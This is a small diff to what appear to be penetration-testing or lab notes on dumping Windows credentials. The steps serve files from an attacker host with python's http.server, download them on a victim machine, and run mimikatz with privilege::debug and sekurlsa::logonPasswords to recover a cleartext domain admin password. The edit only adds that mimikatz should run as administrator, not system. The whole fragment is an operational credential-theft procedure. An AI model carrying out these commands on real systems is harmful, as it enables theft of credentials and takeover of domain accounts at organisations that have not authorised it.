@@ -3,7 +3,7 @@
 - `python3 -m http.server 80`
 - Open Edge on vicitim machine and navigate to attacker's IP
 - Download all 4 files
-- Run mimikatz as administrator on victim machine `mimikatz.exe`
+- Run mimikatz as administrator, not system, on victim machine `mimikatz.exe`
 - Set privilege mode to debug: `privilege::debug`
 - List providers credentials: `sekurlsa::logonPasswords`
 - Cleartext DA password:
